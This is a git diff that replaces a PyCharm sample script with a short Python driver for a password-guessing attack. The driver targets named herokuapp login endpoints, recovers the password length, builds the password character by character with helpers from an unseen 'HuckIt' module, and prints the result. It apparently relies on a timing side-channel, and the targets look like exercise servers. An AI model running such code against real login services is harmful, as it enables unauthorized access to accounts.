@@ -1,16 +1,24 @@
-# This is a sample Python script.
+import time
+import requests
+from HuckIt import find_pass_len, find_tav
 
-# Press Shift+F10 to execute it or replace it with your code.
-# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
-
-
-def print_hi(name):
-    # Use a breakpoint in the code line below to debug your script.
-    print(f'Hi, {name}')  # Press Ctrl+F8 to toggle the breakpoint.
-
-
-# Press the green button in the gutter to run the script.
 if __name__ == '__main__':
-    print_hi('PyCharm')
+    MAX_LEN = 32
 
-# See PyCharm help at https://www.jetbrains.com/help/pycharm/
+    GAL_SITE = True
+
+    if GAL_SITE:
+        url = r'https://verifyserver.herokuapp.com/index'
+        POOL = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+        # POOL_SHORT = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+
+    else:
+        url = "https://passwordserver.herokuapp.com/"
+
+        POOL = '0123456789'
+
+    pswd_len = find_pass_len( url, MAX_LEN)
+    temp_pswd = ""
+    for i in range(pswd_len):
+        temp_pswd += find_tav(pswd_len, temp_pswd)
+    print("the password is : " + temp_pswd)
